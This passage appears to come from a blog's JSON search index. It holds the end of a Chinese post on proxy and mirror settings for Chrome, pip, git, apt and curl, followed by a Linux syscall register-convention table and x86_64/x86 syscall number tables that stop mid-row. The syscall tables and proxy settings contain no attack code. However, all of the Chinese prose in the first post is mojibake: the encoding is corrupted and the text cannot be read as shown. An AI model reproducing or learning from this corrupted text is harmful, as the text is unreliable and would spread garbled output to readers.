ã€‚\næ•…è‹¥éœ€è¦æ›´ç²¾ç»†åŒ–åœ°æ§åˆ¶ç³»ç»Ÿä¸­ä¸åŒç»„ä»¶çš„ä»£ç†è¡Œä¸ºï¼Œåˆ™æ›´é€‚åˆäºä½¿ç”¨åº”ç”¨å±‚çš„ä»£ç†æ¥å£ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç†è½¯ä»¶å®¢æˆ·ç«¯åšçš„ä»…ä»…æ˜¯åœ¨æœ¬åœ°æ‰“å¼€ä¸€ä¸ªç«¯å£ç”¨æ¥ç›‘å¬å’ŒæœåŠ¡ä¸Šå±‚åº”ç”¨ä¸»åŠ¨å‘æ¥çš„ä»£ç†è¯·æ±‚ï¼Œä»¥æ­¤å°†æ˜¯å¦è¢«ä»£ç†çš„é€‰æ‹©æƒäº¤ç”±äº†æ¯ä¸ªåº”ç”¨æœ¬èº«ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œv2rayNçš„è“è‰²å›¾æ ‡å¯¹åº”çš„â€œæ¸…é™¤ç³»ç»Ÿä»£ç†â€å°±æ˜¯è¿™ç§æ–¹æ¡ˆã€‚\néƒ¨åˆ†ç½‘ç«™çš„é•œåƒ Google https://www.ahhhhfs.com/4810/ Github https://www.ahhhhfs.com/18927/ https://www.ahhhhfs.com/18876/ https://www.ahhhhfs.com/5442/ Youtube https://www.ahhhhfs.com/16819/ å„ç§åº”ç”¨çš„ä»£ç†é…ç½®ä¸é•œåƒ chrome chrome é»˜è®¤éµä»ç³»ç»Ÿä»£ç†ã€‚å¯æ˜¯ä½¿ç”¨Proxy SwitchyOmegaæ’ä»¶å¯¹chromeä»£ç†æ–¹å¼è¿›è¡Œæ‰‹åŠ¨é…ç½®ï¼š\nhttps://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif\nLinuxè½¯ä»¶æº ä¸åŒLinuxå‘è¡Œç‰ˆå…·æœ‰ä¸åŒçš„åŒ…ç®¡ç†å™¨ã€‚å³ä½¿æ˜¯åŒä¸€ä¸ªå‘è¡Œç‰ˆçš„ä¸åŒç‰ˆæœ¬ï¼ˆæ¯”å¦‚Ubuntu18.04ä¸Ubuntu20.04ï¼‰ï¼Œå…¶ä¸Šæ¸¸è½¯ä»¶æºä¹Ÿæ˜¯ä¸åŒçš„ã€‚\nä½¿ç”¨å›½å†…é•œåƒä¸ºè½¯ä»¶æºæ¢æºå¯ä»¥å¤§å¤§åŠ é€Ÿå®‰è£…è½¯ä»¶æºä¸Šçš„è½¯ä»¶çš„è¿‡ç¨‹ã€‚ä»¥tunaç»´æŠ¤çš„æ¸…åæºä¸ºä¾‹ï¼Œæˆ‘ä»¬æ¥åˆ°ä½¿ç”¨å¸®åŠ©é¡µé¢ï¼šhttps://mirrors.tuna.tsinghua.edu.cn/help\nç‚¹å‡»ä»»æ„ä½ æƒ³è¦ä½¿ç”¨æ¸…åæºçš„æœåŠ¡ï¼ˆLinuxè½¯ä»¶æºè‡ªç„¶ä¹Ÿæ¶µç›–åœ¨å†…ï¼‰ï¼Œå³èƒ½çœ‹åˆ°tunaä¸ºä½ æä¾›çš„ç›¸åº”ä½¿ç”¨æ•™ç¨‹ã€‚ï¼ˆå¯¹äºLinuxè½¯ä»¶æºï¼Œéœ€é€‰å®šæ­£ç¡®çš„ç³»ç»Ÿç‰ˆæœ¬ï¼‰ã€‚\npip å¯ä½¿ç”¨æ¸…åæºï¼šhttps://mirrors.tuna.tsinghua.edu.cn/help/pypi/\nè‹¥ä½¿ç”¨ä»£ç†æ–¹æ¡ˆï¼Œåœ¨~/.config/pip/pip.confï¼Œä¸­æ·»åŠ ï¼šï¼ˆå°†http://127.0.0.1:1080æ›¿æ¢ä¸ºä½ æœ¬åœ°çš„httpä»£ç†åœ°å€ï¼‰\n1 2 [global] proxy=http://127.0.0.1:1080 ä¸æ”¯æŒsocks5åè®®\ngit ï¼ˆå°†http://127.0.0.1:1080æ›¿æ¢ä¸ºä½ æœ¬åœ°çš„socks5ä»£ç†åœ°å€ï¼‰\n1 git config --global http.proxy socks5://127.0.0.1:1080 apt åœ¨ /etc/apt/apt.conf.d/ ç›®å½•ä¸‹æ–°å¢ proxy.conf æ–‡ä»¶ï¼ŒåŠ å…¥ï¼šï¼ˆå°†http://127.0.0.1:1080æ›¿æ¢ä¸ºä½ æœ¬åœ°çš„httpä»£ç†åœ°å€ï¼‰\n1 2 Acquire::http::Proxy \u0026#34;http://127.0.0.1:1080/\u0026#34;; Acquire::https::Proxy \u0026#34;http://127.0.0.1:1080/\u0026#34;; ä¸æ”¯æŒsocks5åè®®\ncurlã€wget è®¸å¤šposixæ ‡å‡†çš„å‘½ä»¤è¡Œç¨‹åºä¼šéµä»ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼š\n1 2 export http_proxy=http://proxyserver:port/ export https_proxy=https://proxyserver:port/ curlä¹Ÿæ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚\nåŒæ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨curlçš„-xã€--proxyå‚æ•°è¾¾åˆ°åŒæ ·æ•ˆæœï¼š\n1 -x, --proxy \u0026lt;[protocol://][user:password@]proxyhost[:port]\u0026gt; è‹¥æƒ³è¦curlçš„ä»£ç†é…ç½®æ°¸ä¹…ç”Ÿæ•ˆï¼Œå‘~/.curlrcå†™å…¥ï¼šsocks5 = \u0026quot;127.0.0.1:1080\u0026quot;ã€‚\nåŒæ—¶ï¼Œcurléµå¾ªä½†wgetä¸éµå¾ªçš„ç¯å¢ƒå˜é‡ä¸ºï¼š\n1 export all_proxy=http://proxyserver:port/ åˆæ³•ç¿»å¢™ æ¾³é—¨æµé‡å¡ å°±æ˜¯è¿™è´§ğŸ‘‡ï¼Œæ·˜å®ä¸Šå°±å¯ä»¥ä¹°åˆ°ã€‚\nå…¶ä»–æ”»ç•¥ 2022æ°¸ä¹…å…è´¹ç™½å«–èŠ‚ç‚¹æ–¹æ³• https://www.ahhhhfs.com/19188/ ä½¿ç”¨Googleæœç´¢æ‰¾æœºåœºï¼ˆæ¢¯å­ï¼‰æŠ€å·§ https://www.ahhhhfs.com/10889/ ","date":"2022-05-09T11:03:28+08:00","image":"https://s2.loli.net/2022/05/09/FrNVRw5lSbfusgx.jpg","permalink":"https://cerr.cc/post/fuck-the-great-fire-wall/","title":"Fuck the Great Fire Wall"},{"content":"ä¼ å‚è§„åˆ™ arch syscall NR return arg0 arg1 arg2 arg3 arg4 arg5 arm r7 r0 r0 r1 r2 r3 r4 r5 arm64 x8 x0 x0 x1 x2 x3 x4 x5 x86 eax eax ebx ecx edx esi edi ebp x86_64 rax rax rdi rsi rdx r10 r8 r9 x86_64 ç³»ç»Ÿè°ƒç”¨è¡¨ ä»¥ä¸‹è°ƒç”¨è¡¨çš†åŸºäºlinux4.14.0\nNR syscall name %rax arg0 (%rdi) arg1 (%rsi) arg2 (%rdx) 0 read 0x00 unsigned int fd char *buf size_t count 1 write 0x01 unsigned int fd const char *buf size_t count 2 open 0x02 const char *filename int flags umode_t mode 3 close 0x03 unsigned int fd - - 4 stat 0x04 const char *filename struct __old_kernel_stat *statbuf - 5 fstat 0x05 unsigned int fd struct __old_kernel_stat *statbuf - 6 lstat 0x06 const char *filename struct __old_kernel_stat *statbuf - 7 poll 0x07 struct pollfd *ufds unsigned int nfds int timeout 8 lseek 0x08 unsigned int fd off_t offset unsigned int whence 9 mmap 0x09 ? ? ? 10 mprotect 0x0a unsigned long start size_t len unsigned long prot 11 munmap 0x0b unsigned long addr size_t len - 12 brk 0x0c unsigned long brk - - 13 rt_sigaction 0x0d int const struct sigaction * struct sigaction * 14 rt_sigprocmask 0x0e int how sigset_t *set sigset_t *oset 15 rt_sigreturn 0x0f ? ? ? 16 ioctl 0x10 unsigned int fd unsigned int cmd unsigned long arg 17 pread64 0x11 unsigned int fd char *buf size_t count 18 pwrite64 0x12 unsigned int fd const char *buf size_t count 19 readv 0x13 unsigned long fd const struct iovec *vec unsigned long vlen 20 writev 0x14 unsigned long fd const struct iovec *vec unsigned long vlen 21 access 0x15 const char *filename int mode - 22 pipe 0x16 int *fildes - - 23 select 0x17 int n fd_set *inp fd_set *outp 24 sched_yield 0x18 - - - 25 mremap 0x19 unsigned long addr unsigned long old_len unsigned long new_len 26 msync 0x1a unsigned long start size_t len int flags 27 mincore 0x1b unsigned long start size_t len unsigned char * vec 28 madvise 0x1c unsigned long start size_t len int behavior 29 shmget 0x1d key_t key size_t size int flag 30 shmat 0x1e int shmid char *shmaddr int shmflg 31 shmctl 0x1f int shmid int cmd struct shmid_ds *buf 32 dup 0x20 unsigned int fildes - - 33 dup2 0x21 unsigned int oldfd unsigned int newfd - 34 pause 0x22 - - - 35 nanosleep 0x23 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 36 getitimer 0x24 int which struct __kernel_old_itimerval *value - 37 alarm 0x25 unsigned int seconds - - 38 setitimer 0x26 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 39 getpid 0x27 - - - 40 sendfile 0x28 int out_fd int in_fd off_t *offset 41 socket 0x29 int int int 42 connect 0x2a int struct sockaddr * int 43 accept 0x2b int struct sockaddr * int * 44 sendto 0x2c int void * size_t 45 recvfrom 0x2d int void * size_t 46 sendmsg 0x2e int fd struct user_msghdr *msg unsigned flags 47 recvmsg 0x2f int fd struct user_msghdr *msg unsigned flags 48 shutdown 0x30 int int - 49 bind 0x31 int struct sockaddr * int 50 listen 0x32 int int - 51 getsockname 0x33 int struct sockaddr * int * 52 getpeername 0x34 int struct sockaddr * int * 53 socketpair 0x35 int int int 54 setsockopt 0x36 int fd int level int optname 55 getsockopt 0x37 int fd int level int optname 56 clone 0x38 unsigned long unsigned long int * 57 fork 0x39 - - - 58 vfork 0x3a - - - 59 execve 0x3b const char *filename const char *const *argv const char *const *envp 60 exit 0x3c int error_code - - 61 wait4 0x3d pid_t pid int *stat_addr int options 62 kill 0x3e pid_t pid int sig - 63 uname 0x3f struct old_utsname * - - 64 semget 0x40 key_t key int nsems int semflg 65 semop 0x41 int semid struct sembuf *sops unsigned nsops 66 semctl 0x42 int semid int semnum int cmd 67 shmdt 0x43 char *shmaddr - - 68 msgget 0x44 key_t key int msgflg - 69 msgsnd 0x45 int msqid struct msgbuf *msgp size_t msgsz 70 msgrcv 0x46 int msqid struct msgbuf *msgp size_t msgsz 71 msgctl 0x47 int msqid int cmd struct msqid_ds *buf 72 fcntl 0x48 unsigned int fd unsigned int cmd unsigned long arg 73 flock 0x49 unsigned int fd unsigned int cmd - 74 fsync 0x4a unsigned int fd - - 75 fdatasync 0x4b unsigned int fd - - 76 truncate 0x4c const char *path long length - 77 ftruncate 0x4d unsigned int fd unsigned long length - 78 getdents 0x4e unsigned int fd struct linux_dirent *dirent unsigned int count 79 getcwd 0x4f char *buf unsigned long size - 80 chdir 0x50 const char *filename - - 81 fchdir 0x51 unsigned int fd - - 82 rename 0x52 const char *oldname const char *newname - 83 mkdir 0x53 const char *pathname umode_t mode - 84 rmdir 0x54 const char *pathname - - 85 creat 0x55 const char *pathname umode_t mode - 86 link 0x56 const char *oldname const char *newname - 87 unlink 0x57 const char *pathname - - 88 symlink 0x58 const char *old const char *new - 89 readlink 0x59 const char *path char *buf int bufsiz 90 chmod 0x5a const char *filename umode_t mode - 91 fchmod 0x5b unsigned int fd umode_t mode - 92 chown 0x5c const char *filename uid_t user gid_t group 93 fchown 0x5d unsigned int fd uid_t user gid_t group 94 lchown 0x5e const char *filename uid_t user gid_t group 95 umask 0x5f int mask - - 96 gettimeofday 0x60 struct __kernel_old_timeval *tv struct timezone *tz - 97 getrlimit 0x61 unsigned int resource struct rlimit *rlim - 98 getrusage 0x62 int who struct rusage *ru - 99 sysinfo 0x63 struct sysinfo *info - - 100 times 0x64 struct tms *tbuf - - 101 ptrace 0x65 long request long pid unsigned long addr 102 getuid 0x66 - - - 103 syslog 0x67 int type char *buf int len 104 getgid 0x68 - - - 105 setuid 0x69 uid_t uid - - 106 setgid 0x6a gid_t gid - - 107 geteuid 0x6b - - - 108 getegid 0x6c - - - 109 setpgid 0x6d pid_t pid pid_t pgid - 110 getppid 0x6e - - - 111 getpgrp 0x6f - - - 112 setsid 0x70 - - - 113 setreuid 0x71 uid_t ruid uid_t euid - 114 setregid 0x72 gid_t rgid gid_t egid - 115 getgroups 0x73 int gidsetsize gid_t *grouplist - 116 setgroups 0x74 int gidsetsize gid_t *grouplist - 117 setresuid 0x75 uid_t ruid uid_t euid uid_t suid 118 getresuid 0x76 uid_t *ruid uid_t *euid uid_t *suid 119 setresgid 0x77 gid_t rgid gid_t egid gid_t sgid 120 getresgid 0x78 gid_t *rgid gid_t *egid gid_t *sgid 121 getpgid 0x79 pid_t pid - - 122 setfsuid 0x7a uid_t uid - - 123 setfsgid 0x7b gid_t gid - - 124 getsid 0x7c pid_t pid - - 125 capget 0x7d cap_user_header_t header cap_user_data_t dataptr - 126 capset 0x7e cap_user_header_t header const cap_user_data_t data - 127 rt_sigpending 0x7f sigset_t *set size_t sigsetsize - 128 rt_sigtimedwait 0x80 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 129 rt_sigqueueinfo 0x81 pid_t pid int sig siginfo_t *uinfo 130 rt_sigsuspend 0x82 sigset_t *unewset size_t sigsetsize - 131 sigaltstack 0x83 const struct sigaltstack *uss struct sigaltstack *uoss - 132 utime 0x84 char *filename struct utimbuf *times - 133 mknod 0x85 const char *filename umode_t mode unsigned dev 134 uselib 0x86 const char *library - - 135 personality 0x87 unsigned int personality - - 136 ustat 0x88 unsigned dev struct ustat *ubuf - 137 statfs 0x89 const char * path struct statfs *buf - 138 fstatfs 0x8a unsigned int fd struct statfs *buf - 139 sysfs 0x8b int option unsigned long arg1 unsigned long arg2 140 getpriority 0x8c int which int who - 141 setpriority 0x8d int which int who int niceval 142 sched_setparam 0x8e pid_t pid struct sched_param *param - 143 sched_getparam 0x8f pid_t pid struct sched_param *param - 144 sched_setscheduler 0x90 pid_t pid int policy struct sched_param *param 145 sched_getscheduler 0x91 pid_t pid - - 146 sched_get_priority_max 0x92 int policy - - 147 sched_get_priority_min 0x93 int policy - - 148 sched_rr_get_interval 0x94 pid_t pid struct __kernel_timespec *interval - 149 mlock 0x95 unsigned long start size_t len - 150 munlock 0x96 unsigned long start size_t len - 151 mlockall 0x97 int flags - - 152 munlockall 0x98 - - - 153 vhangup 0x99 - - - 154 modify_ldt 0x9a ? ? ? 155 pivot_root 0x9b const char *new_root const char *put_old - 156 _sysctl 0x9c ? ? ? 157 prctl 0x9d int option unsigned long arg2 unsigned long arg3 158 arch_prctl 0x9e ? ? ? 159 adjtimex 0x9f struct __kernel_timex *txc_p - - 160 setrlimit 0xa0 unsigned int resource struct rlimit *rlim - 161 chroot 0xa1 const char *filename - - 162 sync 0xa2 - - - 163 acct 0xa3 const char *name - - 164 settimeofday 0xa4 struct __kernel_old_timeval *tv struct timezone *tz - 165 mount 0xa5 char *dev_name char *dir_name char *type 166 umount2 0xa6 ? ? ? 167 swapon 0xa7 const char *specialfile int swap_flags - 168 swapoff 0xa8 const char *specialfile - - 169 reboot 0xa9 int magic1 int magic2 unsigned int cmd 170 sethostname 0xaa char *name int len - 171 setdomainname 0xab char *name int len - 172 iopl 0xac ? ? ? 173 ioperm 0xad unsigned long from unsigned long num int on 174 create_module 0xae ? ? ? 175 init_module 0xaf void *umod unsigned long len const char *uargs 176 delete_module 0xb0 const char *name_user unsigned int flags - 177 get_kernel_syms 0xb1 ? ? ? 178 query_module 0xb2 ? ? ? 179 quotactl 0xb3 unsigned int cmd const char *special qid_t id 180 nfsservctl 0xb4 ? ? ? 181 getpmsg 0xb5 ? ? ? 182 putpmsg 0xb6 ? ? ? 183 afs_syscall 0xb7 ? ? ? 184 tuxcall 0xb8 ? ? ? 185 security 0xb9 ? ? ? 186 gettid 0xba - - - 187 readahead 0xbb int fd loff_t offset size_t count 188 setxattr 0xbc const char *path const char *name const void *value 189 lsetxattr 0xbd const char *path const char *name const void *value 190 fsetxattr 0xbe int fd const char *name const void *value 191 getxattr 0xbf const char *path const char *name void *value 192 lgetxattr 0xc0 const char *path const char *name void *value 193 fgetxattr 0xc1 int fd const char *name void *value 194 listxattr 0xc2 const char *path char *list size_t size 195 llistxattr 0xc3 const char *path char *list size_t size 196 flistxattr 0xc4 int fd char *list size_t size 197 removexattr 0xc5 const char *path const char *name - 198 lremovexattr 0xc6 const char *path const char *name - 199 fremovexattr 0xc7 int fd const char *name - 200 tkill 0xc8 pid_t pid int sig - 201 time 0xc9 __kernel_old_time_t *tloc - - 202 futex 0xca u32 *uaddr int op u32 val 203 sched_setaffinity 0xcb pid_t pid unsigned int len unsigned long *user_mask_ptr 204 sched_getaffinity 0xcc pid_t pid unsigned int len unsigned long *user_mask_ptr 205 set_thread_area 0xcd ? ? ? 206 io_setup 0xce unsigned nr_reqs aio_context_t *ctx - 207 io_destroy 0xcf aio_context_t ctx - - 208 io_getevents 0xd0 aio_context_t ctx_id long min_nr long nr 209 io_submit 0xd1 aio_context_t long struct iocb 210 io_cancel 0xd2 aio_context_t ctx_id struct iocb *iocb struct io_event *result 211 get_thread_area 0xd3 ? ? ? 212 lookup_dcookie 0xd4 u64 cookie64 char *buf size_t len 213 epoll_create 0xd5 int size - - 214 epoll_ctl_old 0xd6 ? ? ? 215 epoll_wait_old 0xd7 ? ? ? 216 remap_file_pages 0xd8 unsigned long start unsigned long size unsigned long prot 217 getdents64 0xd9 unsigned int fd struct linux_dirent64 *dirent unsigned int count 218 set_tid_address 0xda int *tidptr - - 219 restart_syscall 0xdb - - - 220 semtimedop 0xdc int semid struct sembuf *sops unsigned nsops 221 fadvise64 0xdd int fd loff_t offset size_t len 222 timer_create 0xde clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 223 timer_settime 0xdf timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 224 timer_gettime 0xe0 timer_t timer_id struct __kernel_itimerspec *setting - 225 timer_getoverrun 0xe1 timer_t timer_id - - 226 timer_delete 0xe2 timer_t timer_id - - 227 clock_settime 0xe3 clockid_t which_clock const struct __kernel_timespec *tp - 228 clock_gettime 0xe4 clockid_t which_clock struct __kernel_timespec *tp - 229 clock_getres 0xe5 clockid_t which_clock struct __kernel_timespec *tp - 230 clock_nanosleep 0xe6 clockid_t which_clock int flags const struct __kernel_timespec *rqtp 231 exit_group 0xe7 int error_code - - 232 epoll_wait 0xe8 int epfd struct epoll_event *events int maxevents 233 epoll_ctl 0xe9 int epfd int op int fd 234 tgkill 0xea pid_t tgid pid_t pid int sig 235 utimes 0xeb char *filename struct __kernel_old_timeval *utimes - 236 vserver 0xec ? ? ? 237 mbind 0xed unsigned long start unsigned long len unsigned long mode 238 set_mempolicy 0xee int mode const unsigned long *nmask unsigned long maxnode 239 get_mempolicy 0xef int *policy unsigned long *nmask unsigned long maxnode 240 mq_open 0xf0 const char *name int oflag umode_t mode 241 mq_unlink 0xf1 const char *name - - 242 mq_timedsend 0xf2 mqd_t mqdes const char *msg_ptr size_t msg_len 243 mq_timedreceive 0xf3 mqd_t mqdes char *msg_ptr size_t msg_len 244 mq_notify 0xf4 mqd_t mqdes const struct sigevent *notification - 245 mq_getsetattr 0xf5 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 246 kexec_load 0xf6 unsigned long entry unsigned long nr_segments struct kexec_segment *segments 247 waitid 0xf7 int which pid_t pid struct siginfo *infop 248 add_key 0xf8 const char *_type const char *_description const void *_payload 249 request_key 0xf9 const char *_type const char *_description const char *_callout_info 250 keyctl 0xfa int cmd unsigned long arg2 unsigned long arg3 251 ioprio_set 0xfb int which int who int ioprio 252 ioprio_get 0xfc int which int who - 253 inotify_init 0xfd - - - 254 inotify_add_watch 0xfe int fd const char *path u32 mask 255 inotify_rm_watch 0xff int fd __s32 wd - 256 migrate_pages 0x100 pid_t pid unsigned long maxnode const unsigned long *from 257 openat 0x101 int dfd const char *filename int flags 258 mkdirat 0x102 int dfd const char * pathname umode_t mode 259 mknodat 0x103 int dfd const char * filename umode_t mode 260 fchownat 0x104 int dfd const char *filename uid_t user 261 futimesat 0x105 int dfd const char *filename struct __kernel_old_timeval *utimes 262 newfstatat 0x106 int dfd const char *filename struct stat *statbuf 263 unlinkat 0x107 int dfd const char * pathname int flag 264 renameat 0x108 int olddfd const char * oldname int newdfd 265 linkat 0x109 int olddfd const char *oldname int newdfd 266 symlinkat 0x10a const char * oldname int newdfd const char * newname 267 readlinkat 0x10b int dfd const char *path char *buf 268 fchmodat 0x10c int dfd const char * filename umode_t mode 269 faccessat 0x10d int dfd const char *filename int mode 270 pselect6 0x10e int fd_set * fd_set * 271 ppoll 0x10f struct pollfd * unsigned int struct __kernel_timespec * 272 unshare 0x110 unsigned long unshare_flags - - 273 set_robust_list 0x111 struct robust_list_head *head size_t len - 274 get_robust_list 0x112 int pid struct robust_list_head head_ptr size_t *len_ptr 275 splice 0x113 int fd_in loff_t *off_in int fd_out 276 tee 0x114 int fdin int fdout size_t len 277 sync_file_range 0x115 int fd loff_t offset loff_t nbytes 278 vmsplice 0x116 int fd const struct iovec *iov unsigned long nr_segs 279 move_pages 0x117 pid_t pid unsigned long nr_pages const void pages 280 utimensat 0x118 int dfd const char *filename struct __kernel_timespec *utimes 281 epoll_pwait 0x119 int epfd struct epoll_event *events int maxevents 282 signalfd 0x11a int ufd sigset_t *user_mask size_t sizemask 283 timerfd_create 0x11b int clockid int flags - 284 eventfd 0x11c unsigned int count - - 285 fallocate 0x11d int fd int mode loff_t offset 286 timerfd_settime 0x11e int ufd int flags const struct __kernel_itimerspec *utmr 287 timerfd_gettime 0x11f int ufd struct __kernel_itimerspec *otmr - 288 accept4 0x120 int struct sockaddr * int * 289 signalfd4 0x121 int ufd sigset_t *user_mask size_t sizemask 290 eventfd2 0x122 unsigned int count int flags - 291 epoll_create1 0x123 int flags - - 292 dup3 0x124 unsigned int oldfd unsigned int newfd int flags 293 pipe2 0x125 int *fildes int flags - 294 inotify_init1 0x126 int flags - - 295 preadv 0x127 unsigned long fd const struct iovec *vec unsigned long vlen 296 pwritev 0x128 unsigned long fd const struct iovec *vec unsigned long vlen 297 rt_tgsigqueueinfo 0x129 pid_t tgid pid_t pid int sig 298 perf_event_open 0x12a struct perf_event_attr *attr_uptr pid_t pid int cpu 299 recvmmsg 0x12b int fd struct mmsghdr *msg unsigned int vlen 300 fanotify_init 0x12c unsigned int flags unsigned int event_f_flags - 301 fanotify_mark 0x12d int fanotify_fd unsigned int flags u64 mask 302 prlimit64 0x12e pid_t pid unsigned int resource const struct rlimit64 *new_rlim 303 name_to_handle_at 0x12f int dfd const char *name struct file_handle *handle 304 open_by_handle_at 0x130 int mountdirfd struct file_handle *handle int flags 305 clock_adjtime 0x131 clockid_t which_clock struct __kernel_timex *tx - 306 syncfs 0x132 int fd - - 307 sendmmsg 0x133 int fd struct mmsghdr *msg unsigned int vlen 308 setns 0x134 int fd int nstype - 309 getcpu 0x135 unsigned *cpu unsigned *node struct getcpu_cache *cache 310 process_vm_readv 0x136 pid_t pid const struct iovec *lvec unsigned long liovcnt 311 process_vm_writev 0x137 pid_t pid const struct iovec *lvec unsigned long liovcnt 312 kcmp 0x138 pid_t pid1 pid_t pid2 int type 313 finit_module 0x139 int fd const char *uargs int flags 314 sched_setattr 0x13a pid_t pid struct sched_attr *attr unsigned int flags 315 sched_getattr 0x13b pid_t pid struct sched_attr *attr unsigned int size 316 renameat2 0x13c int olddfd const char *oldname int newdfd 317 seccomp 0x13d unsigned int op unsigned int flags void *uargs 318 getrandom 0x13e char *buf size_t count unsigned int flags 319 memfd_create 0x13f const char *uname_ptr unsigned int flags - 320 kexec_file_load 0x140 int kernel_fd int initrd_fd unsigned long cmdline_len 321 bpf 0x141 int cmd union bpf_attr *attr unsigned int size 322 execveat 0x142 int dfd const char *filename const char *const *argv 323 userfaultfd 0x143 int flags - - 324 membarrier 0x144 int cmd unsigned int flags int cpu_id 325 mlock2 0x145 unsigned long start size_t len int flags 326 copy_file_range 0x146 int fd_in loff_t *off_in int fd_out 327 preadv2 0x147 unsigned long fd const struct iovec *vec unsigned long vlen 328 pwritev2 0x148 unsigned long fd const struct iovec *vec unsigned long vlen 329 pkey_mprotect 0x149 unsigned long start size_t len unsigned long prot 330 pkey_alloc 0x14a unsigned long flags unsigned long init_val - 331 pkey_free 0x14b int pkey - - 332 statx 0x14c int dfd const char *path unsigned flags 333 not implemented 0x14d 334 not implemented 0x14e 335 not implemented 0x14f 336 not implemented 0x150 337 not implemented 0x151 338 not implemented 0x152 339 not implemented 0x153 340 not implemented 0x154 341 not implemented 0x155 342 not implemented 0x156 343 not implemented 0x157 344 not implemented 0x158 345 not implemented 0x159 346 not implemented 0x15a 347 not implemented 0x15b 348 not implemented 0x15c 349 not implemented 0x15d 350 not implemented 0x15e 351 not implemented 0x15f 352 not implemented 0x160 353 not implemented 0x161 354 not implemented 0x162 355 not implemented 0x163 356 not implemented 0x164 357 not implemented 0x165 358 not implemented 0x166 359 not implemented 0x167 360 not implemented 0x168 361 not implemented 0x169 362 not implemented 0x16a 363 not implemented 0x16b 364 not implemented 0x16c 365 not implemented 0x16d 366 not implemented 0x16e 367 not implemented 0x16f 368 not implemented 0x170 369 not implemented 0x171 370 not implemented 0x172 371 not implemented 0x173 372 not implemented 0x174 373 not implemented 0x175 374 not implemented 0x176 375 not implemented 0x177 376 not implemented 0x178 377 not implemented 0x179 378 not implemented 0x17a 379 not implemented 0x17b 380 not implemented 0x17c 381 not implemented 0x17d 382 not implemented 0x17e 383 not implemented 0x17f 384 not implemented 0x180 385 not implemented 0x181 386 not implemented 0x182 387 not implemented 0x183 388 not implemented 0x184 389 not implemented 0x185 390 not implemented 0x186 391 not implemented 0x187 392 not implemented 0x188 393 not implemented 0x189 394 not implemented 0x18a 395 not implemented 0x18b 396 not implemented 0x18c 397 not implemented 0x18d 398 not implemented 0x18e 399 not implemented 0x18f 400 not implemented 0x190 401 not implemented 0x191 402 not implemented 0x192 403 not implemented 0x193 404 not implemented 0x194 405 not implemented 0x195 406 not implemented 0x196 407 not implemented 0x197 408 not implemented 0x198 409 not implemented 0x199 410 not implemented 0x19a 411 not implemented 0x19b 412 not implemented 0x19c 413 not implemented 0x19d 414 not implemented 0x19e 415 not implemented 0x19f 416 not implemented 0x1a0 417 not implemented 0x1a1 418 not implemented 0x1a2 419 not implemented 0x1a3 420 not implemented 0x1a4 421 not implemented 0x1a5 422 not implemented 0x1a6 423 not implemented 0x1a7 424 not implemented 0x1a8 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode x86ç³»ç»Ÿè°ƒç”¨è¡¨ NR syscall name %eax arg0 (%ebx) arg1 (%ecx) arg2 (%edx) 0 restart_syscall 0x00 - - - 1 exit 0x01 int error_code - - 2 fork 0x02 - - - 3 read 0x03 unsigned int fd char *buf size_t count 4 write 0x04 unsigned int fd const char *buf size_t count 5 open 0x05 const char *filename int flags umode_t mode 6 close 0x06 unsigned int fd - - 7 waitpid 0x07 pid_t pid int *stat_addr int options 8 creat 0x08 const char *pathname umode_t mode - 9 link 0x09 const char *oldname const char *newname - 10 unlink 0x0a const char *pathname - - 11 execve 0x0b const char *filename const char *const *argv const char *const *envp 12 chdir 0x0c const char *filename - - 13 time 0x0d __kernel_old_time_t *tloc - - 14 mknod 0x0e const char *filename umode_t mode unsigned dev 15 chmod 0x0f const char *filename umode_t mode - 16 lchown 0x10 const char *filename uid_t user gid_t group 17 break 0x11 ? ? ? 18 oldstat 0x12 ? ? ? 19 lseek 0x13 unsigned int fd off_t offset unsigned int whence 20 getpid 0x14 - - - 21 mount 0x15 char *dev_name char *dir_name char *type 22 umount 0x16 char *name int flags - 23 setuid 0x17 uid_t uid - - 24 getuid 0x18 - - - 25 stime 0x19 __kernel_old_time_t *tptr - - 26 ptrace 0x1a long request long pid unsigned long addr 27 alarm 0x1b unsigned int seconds - - 28 oldfstat 0x1c ? ? ? 29 pause 0x1d - - - 30 utime 0x1e char *filename struct utimbuf *times - 31 stty 0x1f ? ? ? 32 gtty 0x20 ? ? ? 33 access 0x21 const char *filename int mode - 34 nice 0x22 int increment - - 35 ftime 0x23 ? ? ? 36 sync 0x24 - - - 37 kill 0x25 pid_t pid int sig - 38 rename 0x26 const char *oldname const char *newname - 39 mkdir 0x27 const char *pathname umode_t mode - 40 rmdir 0x28 const char *pathname - - 41 dup 0x29 unsigned int fildes - - 42 pipe 0x2a int *fildes - - 43 times 0x2b struct tms *tbuf - - 44 prof 0x2c ? ? ? 45 brk 0x2d unsigned long brk - - 46 setgid 0x2e gid_t gid - - 47 getgid 0x2f - - - 48 signal 0x30 int sig __sighandler_t handler - 49 geteuid 0x31 - - - 50 getegid 0x32 - - - 51 acct 0x33 const char *name - - 52 umount2 0x34 ? ? ? 53 lock 0x35 ? ? ? 54 ioctl 0x36 unsigned int fd unsigned int cmd unsigned long arg 55 fcntl 0x37 unsigned int fd unsigned int cmd unsigned long arg 56 mpx 0x38 ? ? ? 57 setpgid 0x39 pid_t pid pid_t pgid - 58 ulimit 0x3a ? ? ? 59 oldolduname 0x3b ? ? ? 60 umask 0x3c int mask - - 61 chroot 0x3d const char *filename - - 62 ustat 